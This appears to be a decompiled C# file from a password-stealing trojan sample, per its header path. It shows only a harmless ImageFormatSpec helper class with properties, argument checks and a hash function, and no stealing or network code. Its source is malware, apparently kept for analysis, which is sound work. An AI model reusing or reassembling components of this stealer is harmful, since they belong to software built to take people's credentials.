// Decompiled with JetBrains decompiler
// Type: Core.Infrastructure.ImageFormatSpec
// Assembly: AnsiCharMarsha, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 45449883-CB33-464D-BFFF-85C1D8F95247
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Stealer.aipl-731355759034e0ae5cff6011792f40d5154dccd99fac792da878777bbc532ce2.exe

using Core.Helpers;
using System.Drawing.Imaging;

namespace Core.Infrastructure
{
  public abstract class ImageFormatSpec : IImageFormatSpec
  {
    public string Extension { get; set; }

    public string ContentType { get; set; }

    public ImageFormat Format { get; set; }

    protected ImageFormatSpec()
    {
    }

    protected ImageFormatSpec(string extension, string contentType, ImageFormat format)
    {
      Checks.Argument.IsNotEmpty(extension, nameof (extension));
      Checks.Argument.IsNotEmpty(contentType, nameof (contentType));
      Checks.Argument.IsNotNull((object) format, nameof (format));
      this.Extension = extension;
      this.ContentType = contentType;
      this.Format = format;
    }

    public override string ToString() => this.Extension;

    public override int GetHashCode() => ((17 * 23 + this.Extension.NullSafe().GetHashCode()) * 23 + this.ContentType.NullSafe().GetHashCode()) * 23 + this.Format.Guid.GetHashCode();
  }
}
